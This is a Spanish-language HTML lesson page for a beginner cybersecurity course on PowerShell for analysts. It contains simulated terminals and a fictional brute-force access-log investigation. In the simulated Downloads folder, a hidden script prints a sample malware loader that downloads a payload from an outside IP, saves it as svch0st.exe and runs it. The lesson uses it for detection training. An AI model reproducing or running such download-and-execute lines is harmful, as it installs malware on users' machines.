@@ -1,0 +1,319 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Clase 03 · PowerShell para analistas</title>
+<link rel="stylesheet" href="../../../recursos/academia.css">
+</head>
+<body>
+<a class="saltar" href="#contenido">Saltar al contenido</a>
+
+<header class="top">
+  <div class="marca"><span class="logo" aria-hidden="true">&lt;/&gt;</span><span>CYBER<span class="acento">//</span>ACADEMIA</span></div>
+  <div id="reloj" class="reloj-zona"></div>
+  <div id="voz"></div>
+  <a class="btn-mini" href="../../../inicio.html">☰ Menú</a>
+</header>
+
+<div class="layout">
+  <nav id="agenda" class="agenda" aria-label="Agenda de la clase"></nav>
+
+  <main id="contenido">
+    <div class="portada">
+      <p class="kicker">Nivel 0 · Fundamentos · Clase 03</p>
+      <h1>Línea de comandos: PowerShell para analistas</h1>
+      <p class="sub">Muévete por carpetas, lee archivos, filtra con tuberías e investiga un registro de accesos como en un SOC. Duración: 2 horas.</p>
+    </div>
+
+    <section id="c3-repaso" class="bloque" aria-labelledby="t-repaso">
+      <div class="bloque-cab"><p class="kicker"></p></div>
+      <h2 id="t-repaso">Repaso de la Clase 02</h2>
+      <p>Cinco preguntas para calentar antes de empezar.</p>
+      <div data-quiz="repaso"></div>
+    </section>
+
+    <section id="c3-intro" class="bloque" aria-labelledby="t-intro">
+      <div class="bloque-cab"><p class="kicker"></p></div>
+      <h2 id="t-intro">¿Por qué un analista usa la línea de comandos?</h2>
+      <div class="lectura">
+        <p>Las ventanas con botones son cómodas, pero lentas. Imagina que debes revisar diez mil líneas de un registro buscando un ataque: con el ratón tardarías horas, con un comando tardas un segundo.</p>
+        <ul>
+          <li><strong>Rapidez:</strong> un comando hace en segundos lo que con clics tomaría minutos.</li>
+          <li><strong>Ver lo oculto:</strong> archivos ocultos, procesos y conexiones que las ventanas no muestran.</li>
+          <li><strong>Automatizar:</strong> guardas varios comandos en un script y los repites cuando quieras.</li>
+          <li><strong>Trabajar a distancia:</strong> muchos servidores no tienen ventanas, solo terminal.</li>
+        </ul>
+        <h3>Cómo se arma un comando de PowerShell</h3>
+        <p>Recuerda la clase pasada: los cmdlets tienen la forma Verbo guion Sustantivo. Además, pueden llevar parámetros, que empiezan con un guion y le dan detalles a la orden.</p>
+        <pre class="log" data-decir="Por ejemplo: Get-ChildItem, espacio, la ruta Downloads, espacio, guion Filter, espacio, asterisco punto exe.">Get-ChildItem  Downloads  -Filter *.exe
+└── cmdlet ──┘ └─ ruta ─┘ └ parámetro ┘</pre>
+        <ul>
+          <li><strong>Get:</strong> obtener. <strong>Set:</strong> cambiar. <strong>New:</strong> crear. <strong>Remove:</strong> borrar. <strong>Stop:</strong> detener.</li>
+          <li>Un analista usa casi siempre verbos <strong>Get</strong>: mirar sin tocar. Los verbos Set, Remove y Stop cambian cosas, por eso se usan con mucho cuidado.</li>
+          <li><strong>Alias:</strong> nombres cortos. <code>ls</code> y <code>dir</code> son alias de Get-ChildItem; <code>cd</code> es alias de Set-Location; <code>cat</code> es alias de Get-Content.</li>
+          <li><strong>Ayuda:</strong> <code>Get-Help</code> explica cualquier comando. Es tu manual integrado.</li>
+        </ul>
+        <div class="nota">
+          <p><strong>El asterisco es un comodín:</strong> significa "cualquier cosa". Asterisco punto exe significa "cualquier archivo que termine en punto exe".</p>
+        </div>
+      </div>
+      <h3>Actividad: ¿mira o cambia?</h3>
+      <div data-actividad="verbos"></div>
+    </section>
+
+    <section id="c3-navegar" class="bloque" aria-labelledby="t-navegar">
+      <div class="bloque-cab"><p class="kicker"></p></div>
+      <h2 id="t-navegar">Moverse por carpetas y leer archivos</h2>
+      <div class="lectura">
+        <p>Una ruta es la dirección de un archivo, como la dirección de una casa: país, ciudad, calle, número. Por ejemplo, C dos puntos, barra, Users, barra, alumno, barra, Downloads.</p>
+        <div class="tabla">
+          <table>
+            <thead><tr><th>Comando</th><th>Alias</th><th>Qué hace</th></tr></thead>
+            <tbody>
+              <tr><td><code>Get-Location</code></td><td><code>pwd</code></td><td>Dice en qué carpeta estás.</td></tr>
+              <tr><td><code>Get-ChildItem</code></td><td><code>ls</code>, <code>dir</code></td><td>Lista lo que hay en una carpeta.</td></tr>
+              <tr><td><code>Set-Location Downloads</code></td><td><code>cd Downloads</code></td><td>Entra a la carpeta Downloads. <code>cd ..</code> sube un nivel.</td></tr>
+              <tr><td><code>Get-ChildItem -Force</code></td><td><code>ls -Force</code></td><td>Muestra también los archivos ocultos.</td></tr>
+              <tr><td><code>Get-Content archivo.txt</code></td><td><code>cat</code>, <code>type</code></td><td>Muestra el contenido de un archivo de texto.</td></tr>
+            </tbody>
+          </table>
+        </div>
+        <div class="nota alerta">
+          <p><strong>¿Por qué importan los ocultos?</strong> Los atacantes esconden sus scripts marcándolos como ocultos, esperando que nadie los vea. Un analista siempre mira con el parámetro Force.</p>
+        </div>
+        <p>En esta simulación el prompt no cambia de carpeta: escribe las rutas tal como aparecen en cada misión.</p>
+      </div>
+      <div data-terminal="nav"></div>
+    </section>
+
+    <section id="c3-descanso" class="bloque descanso" aria-labelledby="t-descanso">
+      <div class="bloque-cab"><p class="kicker"></p></div>
+      <p class="grande" aria-hidden="true">☕</p>
+      <h2 id="t-descanso">Descanso de 10 minutos</h2>
+      <p>Estira la espalda, toma agua y descansa la vista.</p>
+      <p>Reto mental: ¿qué parámetro usarías para ver archivos ocultos?</p>
+    </section>
+
+    <section id="c3-tuberias" class="bloque" aria-labelledby="t-tuberias">
+      <div class="bloque-cab"><p class="kicker"></p></div>
+      <h2 id="t-tuberias">Tuberías: filtrar, ordenar y contar</h2>
+      <div class="lectura">
+        <p>La tubería, la barra vertical, pasa el resultado de un comando al siguiente, como una cadena de montaje. Con unos pocos comandos puedes filtrar miles de líneas.</p>
+        <div class="tabla">
+          <table>
+            <thead><tr><th>Comando</th><th>Para qué sirve</th><th>Ejemplo</th></tr></thead>
+            <tbody>
+              <tr><td><code>Select-String</code></td><td>Buscar líneas que contienen un texto (como el buscador de Word).</td><td><code>Select-String -Path log.txt -Pattern "FAIL"</code></td></tr>
+              <tr><td><code>Where-Object</code></td><td>Quedarse solo con lo que cumple una condición.</td><td><code>Get-Service | Where-Object Status -eq 'Stopped'</code></td></tr>
+              <tr><td><code>Sort-Object</code></td><td>Ordenar.</td><td><code>Get-Process | Sort-Object CPU -Descending</code></td></tr>
+              <tr><td><code>Select-Object</code></td><td>Elegir columnas o los primeros resultados.</td><td><code>Select-Object -First 5</code></td></tr>
+              <tr><td><code>Measure-Object</code></td><td>Contar.</td><td><code>Get-Process | Measure-Object</code></td></tr>
+            </tbody>
+          </table>
+        </div>
+        <p>Otro truco: <code>Get-Content archivo -Tail 3</code> muestra solo las últimas tres líneas. Es útil porque en un registro lo más nuevo está al final.</p>
+      </div>
+      <h3>Actividad: ¿qué comando usarías?</h3>
+      <div data-actividad="tuberias"></div>
+    </section>
+
+    <section id="c3-investigacion" class="bloque" aria-labelledby="t-investigacion">
+      <div class="bloque-cab"><p class="kicker"></p></div>
+      <h2 id="t-investigacion">Simulación SOC: investiga el registro de accesos</h2>
+      <div class="lectura">
+        <p>Son las ocho de la mañana. La empresa te avisa que anoche alguien abrió el archivo de clientes sin permiso. Tienes el registro de accesos del servidor en C dos puntos, barra, Logs, barra, acceso punto log. Investiga con PowerShell y luego responde las preguntas.</p>
+      </div>
+      <div data-terminal="inv"></div>
+      <h3>Tus conclusiones</h3>
+      <div data-actividad="conclusiones"></div>
+    </section>
+
+    <section id="c3-real" class="bloque" aria-labelledby="t-real">
+      <div class="bloque-cab"><p class="kicker"></p></div>
+      <h2 id="t-real">Ahora en tu PowerShell real</h2>
+      <p>Estos comandos solo leen información. Ábrelos en PowerShell (tecla Windows, escribe PowerShell) y anota en tus notas lo que encuentres.</p>
+      <h3>1. El manual de un comando</h3>
+<pre data-copiar>Get-Help Get-ChildItem</pre>
+      <h3>2. ¿Cuántos comandos "Get" existen?</h3>
+<pre data-copiar>Get-Command -Verb Get | Measure-Object</pre>
+      <h3>3. Archivos de tu carpeta Descargas, incluidos los ocultos</h3>
+<pre data-copiar>Get-ChildItem $HOME\Downloads -Force</pre>
+      <h3>4. ¿Hay programas .exe en tus Descargas?</h3>
+<pre data-copiar>Get-ChildItem $HOME\Downloads -Filter *.exe</pre>
+      <p><code>$HOME</code> es un atajo que significa "mi carpeta de usuario".</p>
+    </section>
+
+    <section id="c3-ingles" class="bloque" aria-labelledby="t-ingles">
+      <div class="bloque-cab"><p class="kicker"></p></div>
+      <h2 id="t-ingles">Inglés técnico del día</h2>
+      <ul class="vocab">
+        <li data-en="get"><span><span class="en" lang="en">get</span><span class="es">obtener</span><span class="pr">guet</span></span></li>
+        <li data-en="set"><span><span class="en" lang="en">set</span><span class="es">establecer, cambiar</span><span class="pr">set</span></span></li>
+        <li data-en="remove"><span><span class="en" lang="en">remove</span><span class="es">quitar, borrar</span><span class="pr">ri-múv</span></span></li>
+        <li data-en="hidden"><span><span class="en" lang="en">hidden</span><span class="es">oculto</span><span class="pr">jí-den</span></span></li>
+        <li data-en="path"><span><span class="en" lang="en">path</span><span class="es">ruta</span><span class="pr">paz</span></span></li>
+        <li data-en="content"><span><span class="en" lang="en">content</span><span class="es">contenido</span><span class="pr">cón-tent</span></span></li>
+        <li data-en="pattern"><span><span class="en" lang="en">pattern</span><span class="es">patrón</span><span class="pr">pá-tern</span></span></li>
+        <li data-en="failed"><span><span class="en" lang="en">failed</span><span class="es">fallido</span><span class="pr">féild</span></span></li>
+      </ul>
+    </section>
+
+    <section id="c3-examen" class="bloque" aria-labelledby="t-examen">
+      <div class="bloque-cab"><p class="kicker"></p></div>
+      <h2 id="t-examen">Examen final</h2>
+      <p>Diez preguntas. Solo cuenta tu primera respuesta.</p>
+      <div data-quiz="examen"></div>
+    </section>
+
+    <section id="cierre" class="bloque" aria-labelledby="t-cierre">
+      <p class="kicker">Cierre</p>
+      <h2 id="t-cierre">Mis notas</h2>
+      <label for="notas">Dudas y lo que encontraste en tu PowerShell real:</label>
+      <textarea id="notas" data-notas="generales" placeholder="Por ejemplo: en mis Descargas hay 3 archivos .exe…"></textarea>
+      <p>Tu avance se guarda solo. Al terminar, dile a Claude "revisa mi avance".</p>
+      <div id="resumen"></div>
+    </section>
+  </main>
+</div>
+
+<p class="pie">Cyber//Academia · Clase 03 · Todas las prácticas usan datos ficticios.</p>
+
+<script>
+const LOG_ACCESO = '2026-11-09 22:01:14 LOGIN OK    user=maria   ip=192.168.1.20\n2026-11-09 23:40:02 LOGIN FAIL  user=admin   ip=203.0.113.77\n2026-11-09 23:40:05 LOGIN FAIL  user=admin   ip=203.0.113.77\n2026-11-09 23:40:09 LOGIN FAIL  user=admin   ip=203.0.113.77\n2026-11-09 23:40:12 LOGIN FAIL  user=root    ip=203.0.113.77\n2026-11-09 23:40:16 LOGIN FAIL  user=soporte ip=203.0.113.77\n2026-11-09 23:40:20 LOGIN OK    user=soporte ip=203.0.113.77\n2026-11-09 23:41:03 FILE READ   user=soporte file=clientes.xlsx\n2026-11-10 08:02:44 LOGIN OK    user=jose    ip=192.168.1.31\n2026-11-10 08:15:10 LOGIN FAIL  user=jose    ip=192.168.1.31';
+const FALLOS = 'C:\\Logs\\acceso.log:2:2026-11-09 23:40:02 LOGIN FAIL  user=admin   ip=203.0.113.77\nC:\\Logs\\acceso.log:3:2026-11-09 23:40:05 LOGIN FAIL  user=admin   ip=203.0.113.77\nC:\\Logs\\acceso.log:4:2026-11-09 23:40:09 LOGIN FAIL  user=admin   ip=203.0.113.77\nC:\\Logs\\acceso.log:5:2026-11-09 23:40:12 LOGIN FAIL  user=root    ip=203.0.113.77\nC:\\Logs\\acceso.log:6:2026-11-09 23:40:16 LOGIN FAIL  user=soporte ip=203.0.113.77\nC:\\Logs\\acceso.log:10:2026-11-10 08:15:10 LOGIN FAIL  user=jose    ip=192.168.1.31';
+window.CLASE = {
+  id: 'ciber-03',
+  titulo: 'Ciberseguridad · Clase 03: PowerShell para analistas',
+  bloques: [
+    { id: 'c3-repaso', titulo: 'Repaso de la Clase 02', min: 10 },
+    { id: 'c3-intro', titulo: '¿Por qué la línea de comandos?', min: 15 },
+    { id: 'c3-navegar', titulo: 'Carpetas y archivos', min: 20 },
+    { id: 'c3-descanso', titulo: 'Descanso', min: 10 },
+    { id: 'c3-tuberias', titulo: 'Tuberías', min: 15 },
+    { id: 'c3-investigacion', titulo: 'Simulación SOC', min: 25 },
+    { id: 'c3-real', titulo: 'PowerShell real', min: 10 },
+    { id: 'c3-ingles', titulo: 'Inglés técnico', min: 5 },
+    { id: 'c3-examen', titulo: 'Examen final', min: 10 }
+  ],
+  terminales: {
+    nav: {
+      titulo: 'Windows PowerShell (simulación)',
+      prompt: 'PS C:\\Users\\alumno>',
+      bienvenida: 'Terminal de práctica. Nada de lo que escribas afecta tu computadora.\nEscribe "help" para ver los comandos de esta práctica.',
+      ayuda: 'Comandos de esta práctica:\n  Get-Location (pwd)\n  Get-ChildItem (ls, dir)\n  Get-ChildItem Downloads\n  Get-ChildItem Downloads -Force\n  Get-ChildItem Downloads -Filter *.exe\n  Get-Content notas.txt (cat notas.txt)\n  Get-Content Downloads\\.actualizar.ps1\n  Get-Help Get-ChildItem\n  cls',
+      error: "{cmd} : El término '{cmd}' no se reconoce como nombre de un cmdlet, función o programa ejecutable.\n💡 Revisa cómo lo escribiste o escribe help.",
+      comandos: {
+        'Get-Location': { alias: ['pwd', 'gl'], salida: 'Path\n----\nC:\\Users\\alumno', explica: 'Estás en tu carpeta de usuario.' },
+        'Get-ChildItem': { alias: ['ls', 'dir', 'gci'], salida: '    Directorio: C:\\Users\\alumno\n\nMode    LastWriteTime        Length Name\n----    -------------        ------ ----\nd-----  10/11/2026  18:02           Desktop\nd-----  10/11/2026  18:40           Documents\nd-----  10/11/2026  18:55           Downloads\n-a----  10/11/2026  09:12       214 notas.txt', explica: 'La d al inicio indica carpeta (directorio). La a indica un archivo normal.' },
+        'Get-ChildItem Downloads': { alias: ['ls downloads', 'dir downloads', 'gci downloads'], salida: '    Directorio: C:\\Users\\alumno\\Downloads\n\nMode    LastWriteTime        Length Name\n----    -------------        ------ ----\n-a----  08/11/2026  10:20   1843200 setup_editor.exe\n-a----  10/11/2026  18:57     88576 factura_noviembre.pdf.exe\n-a----  09/11/2026  16:03    310412 horario.pdf', explica: 'Parece todo normal… pero ¿y si hay algo oculto? Prueba con -Force.' },
+        'Get-ChildItem Downloads -Force': { alias: ['ls downloads -force', 'dir downloads -force', 'gci downloads -force', 'ls -force downloads', 'dir -force downloads', 'get-childitem -force downloads'], salida: '    Directorio: C:\\Users\\alumno\\Downloads\n\nMode    LastWriteTime        Length Name\n----    -------------        ------ ----\n-a-h--  10/11/2026  18:58      1204 .actualizar.ps1\n-a----  08/11/2026  10:20   1843200 setup_editor.exe\n-a----  10/11/2026  18:57     88576 factura_noviembre.pdf.exe\n-a----  09/11/2026  16:03    310412 horario.pdf', explica: '¡Apareció .actualizar.ps1! La h en "Mode" significa hidden (oculto). Se creó un minuto después de la factura falsa: muy sospechoso.' },
+        'Get-ChildItem Downloads -Filter *.exe': { alias: ['ls downloads -filter *.exe', 'dir downloads -filter *.exe', 'gci downloads -filter *.exe', 'dir downloads\\*.exe', 'ls downloads\\*.exe'], salida: '    Directorio: C:\\Users\\alumno\\Downloads\n\nMode    LastWriteTime        Length Name\n----    -------------        ------ ----\n-a----  08/11/2026  10:20   1843200 setup_editor.exe\n-a----  10/11/2026  18:57     88576 factura_noviembre.pdf.exe', explica: 'El filtro *.exe muestra solo programas. factura_noviembre.pdf.exe es la doble extensión que viste en la Clase 02.' },
+        'Get-Content notas.txt': { alias: ['cat notas.txt', 'type notas.txt', 'gc notas.txt'], salida: 'Tareas de la semana:\n- Terminar el informe\n- Llamar a soporte\n- Revisar la factura que llegó por correo', explica: 'Get-Content muestra un archivo de texto. Fíjate: el usuario abrió una "factura que llegó por correo"…' },
+        'Get-Content Downloads\\.actualizar.ps1': { alias: ['cat downloads\\.actualizar.ps1', 'type downloads\\.actualizar.ps1', 'gc downloads\\.actualizar.ps1', 'get-content downloads/.actualizar.ps1', 'cat downloads/.actualizar.ps1'], salida: '# script descargado automáticamente\n$s = "http://198.51.100.77/payload"\nInvoke-WebRequest $s -OutFile $env:TEMP\\svch0st.exe\nStart-Process $env:TEMP\\svch0st.exe', explica: 'Leer un script NO lo ejecuta: es seguro. Este descarga un programa de internet, lo guarda como svch0st.exe (con cero) y lo ejecuta. ¡Es el malware que cazaste en la Clase 02!' },
+        'Get-Help Get-ChildItem': { alias: ['help get-childitem', 'get-help ls', 'help ls', 'get-help dir'], salida: 'NOMBRE\n    Get-ChildItem\n\nSINOPSIS\n    Obtiene los elementos de una o más ubicaciones especificadas.\n\nSINTAXIS\n    Get-ChildItem [[-Path] <String[]>] [-Filter <String>] [-Force] [-Recurse] ...', explica: 'Get-Help es tu manual. Muestra para qué sirve un comando y qué parámetros acepta.' }
+      },
+      misiones: [
+        { texto: 'Averigua en qué carpeta estás.', cmd: 'Get-Location' },
+        { texto: 'Lista lo que hay en tu carpeta.', cmd: 'Get-ChildItem' },
+        { texto: 'Lista la carpeta Downloads.', cmd: 'Get-ChildItem Downloads' },
+        { texto: 'Lista Downloads incluyendo los archivos ocultos.', cmd: 'Get-ChildItem Downloads -Force' },
+        { texto: 'Muestra solo los programas .exe de Downloads.', cmd: 'Get-ChildItem Downloads -Filter *.exe' },
+        { texto: 'Lee el archivo notas.txt.', cmd: 'Get-Content notas.txt' },
+        { texto: 'Lee el script oculto que encontraste (Downloads\\.actualizar.ps1).', cmd: 'Get-Content Downloads\\.actualizar.ps1' },
+        { texto: 'Consulta el manual de Get-ChildItem.', cmd: 'Get-Help Get-ChildItem' }
+      ]
+    },
+    inv: {
+      titulo: 'Windows PowerShell · Servidor SRV-01 (simulación)',
+      prompt: 'PS C:\\Logs>',
+      bienvenida: 'Conectado al servidor SRV-01. Escribe "help" para ver los comandos de esta investigación.',
+      ayuda: 'Comandos de esta investigación:\n  Get-Content C:\\Logs\\acceso.log\n  Get-Content C:\\Logs\\acceso.log -Tail 3\n  Select-String -Path C:\\Logs\\acceso.log -Pattern "FAIL"\n  (Select-String -Path C:\\Logs\\acceso.log -Pattern "FAIL").Count\n  Select-String -Path C:\\Logs\\acceso.log -Pattern "203.0.113.77"\n  Select-String -Path C:\\Logs\\acceso.log -Pattern "clientes"',
+      error: "{cmd} : El término '{cmd}' no se reconoce, o la ruta no existe.\n💡 Escribe help para ver los comandos de esta investigación.",
+      comandos: {
+        'Get-Content C:\\Logs\\acceso.log': { alias: ['cat c:\\logs\\acceso.log', 'gc c:\\logs\\acceso.log', 'type c:\\logs\\acceso.log', 'get-content acceso.log', 'cat acceso.log'], salida: LOG_ACCESO, explica: 'Este es el registro completo. Busca palabras clave: FAIL (fallo), OK (éxito) y FILE READ (archivo leído).' },
+        'Get-Content C:\\Logs\\acceso.log -Tail 3': { alias: ['cat c:\\logs\\acceso.log -tail 3', 'gc c:\\logs\\acceso.log -tail 3', 'get-content acceso.log -tail 3'], salida: '2026-11-09 23:41:03 FILE READ   user=soporte file=clientes.xlsx\n2026-11-10 08:02:44 LOGIN OK    user=jose    ip=192.168.1.31\n2026-11-10 08:15:10 LOGIN FAIL  user=jose    ip=192.168.1.31', explica: '-Tail 3 muestra solo las 3 últimas líneas: lo más reciente.' },
+        'Select-String -Path C:\\Logs\\acceso.log -Pattern "FAIL"': { alias: ['select-string -path c:\\logs\\acceso.log -pattern fail', "select-string -path c:\\logs\\acceso.log -pattern 'fail'", 'select-string -path acceso.log -pattern "fail"', 'select-string -path acceso.log -pattern fail', 'get-content c:\\logs\\acceso.log | select-string "fail"', 'cat c:\\logs\\acceso.log | select-string fail', 'cat c:\\logs\\acceso.log | select-string "fail"'], salida: FALLOS, explica: 'Solo las líneas con FAIL. El número después del nombre del archivo es el número de línea.' },
+        '(Select-String -Path C:\\Logs\\acceso.log -Pattern "FAIL").Count': { alias: ['(select-string -path c:\\logs\\acceso.log -pattern fail).count', 'select-string -path c:\\logs\\acceso.log -pattern "fail" | measure-object', 'select-string -path c:\\logs\\acceso.log -pattern fail | measure-object', '(select-string -path acceso.log -pattern "fail").count'], salida: '6', explica: 'Hay 6 fallos en total. Pero ¿todos vienen de la misma IP? Mira bien la lista de fallos.' },
+        'Select-String -Path C:\\Logs\\acceso.log -Pattern "203.0.113.77"': { alias: ['select-string -path c:\\logs\\acceso.log -pattern 203.0.113.77', 'select-string -path acceso.log -pattern "203.0.113.77"', 'cat c:\\logs\\acceso.log | select-string "203.0.113.77"'], salida: 'C:\\Logs\\acceso.log:2:2026-11-09 23:40:02 LOGIN FAIL  user=admin   ip=203.0.113.77\nC:\\Logs\\acceso.log:3:2026-11-09 23:40:05 LOGIN FAIL  user=admin   ip=203.0.113.77\nC:\\Logs\\acceso.log:4:2026-11-09 23:40:09 LOGIN FAIL  user=admin   ip=203.0.113.77\nC:\\Logs\\acceso.log:5:2026-11-09 23:40:12 LOGIN FAIL  user=root    ip=203.0.113.77\nC:\\Logs\\acceso.log:6:2026-11-09 23:40:16 LOGIN FAIL  user=soporte ip=203.0.113.77\nC:\\Logs\\acceso.log:7:2026-11-09 23:40:20 LOGIN OK    user=soporte ip=203.0.113.77', explica: 'Todo lo que hizo esa IP: 5 fallos probando varios usuarios en 18 segundos, y luego entró con la cuenta soporte.' },
+        'Select-String -Path C:\\Logs\\acceso.log -Pattern "clientes"': { alias: ['select-string -path c:\\logs\\acceso.log -pattern clientes', 'select-string -path acceso.log -pattern "clientes"', 'cat c:\\logs\\acceso.log | select-string "clientes"'], salida: 'C:\\Logs\\acceso.log:8:2026-11-09 23:41:03 FILE READ   user=soporte file=clientes.xlsx', explica: '43 segundos después de entrar, la cuenta soporte leyó el archivo de clientes.' }
+      },
+      misiones: [
+        { texto: 'Lee el registro completo.', cmd: 'Get-Content C:\\Logs\\acceso.log' },
+        { texto: 'Muestra solo las 3 últimas líneas.', cmd: 'Get-Content C:\\Logs\\acceso.log -Tail 3' },
+        { texto: 'Filtra solo los inicios de sesión fallidos (FAIL).', cmd: 'Select-String -Path C:\\Logs\\acceso.log -Pattern "FAIL"' },
+        { texto: 'Cuenta cuántos fallos hay.', cmd: '(Select-String -Path C:\\Logs\\acceso.log -Pattern "FAIL").Count' },
+        { texto: 'Busca todo lo que hizo la IP 203.0.113.77.', cmd: 'Select-String -Path C:\\Logs\\acceso.log -Pattern "203.0.113.77"' },
+        { texto: 'Busca quién abrió el archivo de clientes.', cmd: 'Select-String -Path C:\\Logs\\acceso.log -Pattern "clientes"' }
+      ]
+    }
+  },
+  actividades: {
+    verbos: {
+      titulo: '¿Mira o cambia?',
+      preguntas: [{ label: 'Este comando…', corto: 'Respuesta', opciones: ['Solo mira', 'Cambia algo'] }],
+      items: [
+        { titulo: 'Get-Process', respuestas: [['Solo mira']], pista: 'Fíjate en el verbo.', explica: 'Get = obtener información, sin tocar nada.' },
+        { titulo: 'Stop-Process -Name notepad', respuestas: [['Cambia algo']], pista: '¿Qué significa Stop?', explica: 'Stop detiene un proceso: cambia el estado del equipo.' },
+        { titulo: 'Remove-Item informe.docx', respuestas: [['Cambia algo']], pista: 'Remove = quitar.', explica: 'Borra un archivo. ¡Cuidado con los Remove!' },
+        { titulo: 'Get-ChildItem -Force', respuestas: [['Solo mira']], pista: 'El parámetro no cambia el verbo.', explica: 'Solo lista archivos, incluidos los ocultos.' },
+        { titulo: 'Set-Location C:\\Logs', respuestas: [['Solo mira']], pista: 'Cambia dónde estás tú, pero ¿cambia algo del equipo?', explica: 'Set-Location solo te mueve de carpeta; no modifica archivos ni configuraciones.' },
+        { titulo: 'New-LocalUser -Name pirata', respuestas: [['Cambia algo']], pista: 'New = crear.', explica: 'Crea un usuario nuevo. Los atacantes lo hacen para volver a entrar.' }
+      ]
+    },
+    tuberias: {
+      titulo: '¿Qué comando usarías?',
+      preguntas: [{ label: '¿Cuál es el mejor comando?', corto: 'Respuesta', opciones: ['Select-String', 'Sort-Object', 'Measure-Object', 'Select-Object -First 5'], columna: true }],
+      items: [
+        { titulo: 'Buscar las líneas que dicen "ERROR" en un registro.', respuestas: [['Select-String']], pista: 'Es como el buscador de texto.', explica: 'Select-String busca un texto dentro de archivos.' },
+        { titulo: 'Saber cuántos procesos hay en ejecución.', respuestas: [['Measure-Object']], pista: 'La palabra clave es "cuántos".', explica: 'Measure-Object cuenta.' },
+        { titulo: 'Ordenar los procesos por uso de memoria.', respuestas: [['Sort-Object']], pista: 'Ordenar = sort.', explica: 'Sort-Object ordena por la columna que digas.' },
+        { titulo: 'Ver solo los 5 primeros resultados de una lista larga.', respuestas: [['Select-Object -First 5']], pista: 'Elegir los primeros.', explica: 'Select-Object -First 5 se queda con los 5 primeros.' }
+      ]
+    },
+    conclusiones: {
+      titulo: 'Conclusiones de la investigación',
+      preguntas: [{ label: 'Tu respuesta:', corto: 'Respuesta', opciones: [], columna: true }],
+      items: [
+        { titulo: '¿Desde qué IP vino el ataque?', opciones: [['192.168.1.20', '203.0.113.77', '192.168.1.31']], respuestas: [['203.0.113.77']], pista: 'Busca la IP con muchos FAIL seguidos.', explica: '203.0.113.77 falló 5 veces en 18 segundos.' },
+        { titulo: '¿Cuántos intentos fallidos hizo el atacante?', opciones: [['5', '6', '10']], respuestas: [['5']], pista: 'Hay 6 fallos en total, pero uno es de otra IP.', explica: '5 fallos del atacante. El fallo de jose a las 8:15 es de la red interna y parece un error normal de contraseña.' },
+        { titulo: '¿Qué cuenta logró comprometer?', opciones: [['admin', 'root', 'soporte']], respuestas: [['soporte']], pista: 'Busca el LOGIN OK de esa IP.', explica: 'Entró con la cuenta soporte a las 23:40:20.' },
+        { titulo: '¿Qué hizo después de entrar?', opciones: [['Leyó el archivo clientes.xlsx', 'Se desconectó sin hacer nada', 'Cambió su contraseña']], respuestas: [['Leyó el archivo clientes.xlsx']], pista: 'Mira la línea FILE READ.', explica: 'Leyó el archivo de clientes: un ataque a la Confidencialidad.' },
+        { titulo: '¿Qué tipo de ataque fue?', opciones: [['DDoS', 'Fuerza bruta probando varios usuarios', 'Ransomware']], respuestas: [['Fuerza bruta probando varios usuarios']], pista: 'Muchos intentos de contraseña seguidos…', explica: 'Probó usuarios comunes (admin, root, soporte) hasta acertar uno: fuerza bruta.' },
+        { titulo: '¿Cuál es la mejor primera acción?', opciones: [['Bloquear la IP y la cuenta soporte, y cambiar su contraseña con MFA', 'Borrar el registro', 'Esperar a ver si vuelve']], respuestas: [['Bloquear la IP y la cuenta soporte, y cambiar su contraseña con MFA']], pista: 'Contener primero.', explica: 'Contener: cortar el acceso del atacante. Luego avisar, porque se expusieron datos de clientes.' }
+      ]
+    }
+  },
+  quizzes: {
+    repaso: {
+      titulo: 'Repaso de la Clase 02',
+      preguntas: [
+        { q: '¿Qué parte del computador se borra al apagarlo?', opciones: ['El disco', 'La RAM', 'La tarjeta de red'], correcta: 1, explica: 'La RAM es memoria temporal.' },
+        { q: '¿Qué es el PID?', opciones: ['El número único de un proceso', 'Una contraseña', 'Un antivirus'], correcta: 0, explica: 'Process ID: identificador de proceso.' },
+        { q: '¿Dónde vive el svchost.exe legítimo?', opciones: ['C:\\Users\\Public', 'C:\\Windows\\System32', 'Descargas'], correcta: 1, explica: 'Fuera de System32 es sospechoso.' },
+        { q: 'El principio de mínimo privilegio dice que…', opciones: ['Todos deben ser administradores', 'Cada uno tiene solo los permisos que necesita', 'No hacen falta contraseñas'], correcta: 1, explica: 'Así, si roban una cuenta, el daño es limitado.' },
+        { q: '¿Qué hace la tubería | en PowerShell?', opciones: ['Pasa el resultado de un comando al siguiente', 'Borra archivos', 'Apaga la PC'], correcta: 0, explica: 'Es una cadena de montaje de comandos.' }
+      ]
+    },
+    examen: {
+      titulo: 'Examen final',
+      preguntas: [
+        { q: '¿Qué hace Get-Location?', opciones: ['Dice en qué carpeta estás', 'Borra la carpeta', 'Muestra procesos'], correcta: 0, explica: 'Su alias es pwd.' },
+        { q: '¿Qué parámetro muestra los archivos ocultos?', opciones: ['-Hidden', '-Force', '-All'], correcta: 1, explica: 'Get-ChildItem -Force.' },
+        { q: 'En la columna Mode, la letra h significa…', opciones: ['Hora', 'Hidden (oculto)', 'Hash'], correcta: 1, explica: 'h = hidden.' },
+        { q: '¿Qué comando muestra el contenido de un archivo de texto?', opciones: ['Get-Content', 'Get-Process', 'Set-Location'], correcta: 0, explica: 'Sus alias son cat y type.' },
+        { q: '¿Qué comando busca un texto dentro de un archivo?', opciones: ['Sort-Object', 'Select-String', 'Measure-Object'], correcta: 1, explica: 'Select-String es el buscador.' },
+        { q: '¿Para qué sirve -Tail 3?', opciones: ['Muestra las 3 primeras líneas', 'Muestra las 3 últimas líneas', 'Borra 3 líneas'], correcta: 1, explica: 'Tail significa cola: el final.' },
+        { q: '¿Qué verbo usa casi siempre un analista para investigar sin tocar nada?', opciones: ['Remove', 'Get', 'Stop'], correcta: 1, explica: 'Get solo obtiene información.' },
+        { q: 'El asterisco en *.exe significa…', opciones: ['Archivo importante', 'Cualquier nombre', 'Archivo oculto'], correcta: 1, explica: 'Es un comodín.' },
+        { q: '¿Leer un script con Get-Content lo ejecuta?', opciones: ['Sí', 'No, solo muestra su texto'], correcta: 1, explica: 'Leer es seguro; ejecutar no.' },
+        { q: '¿Qué significa "failed" en inglés?', opciones: ['Fallido', 'Oculto', 'Ruta'], correcta: 0, explica: 'Failed = fallido. Se pronuncia "féild".' }
+      ]
+    }
+  }
+};
+</script>
+<script src="../../../recursos/sync.js"></script>
+<script src="../../../recursos/academia.js"></script>
+</body>
+</html>
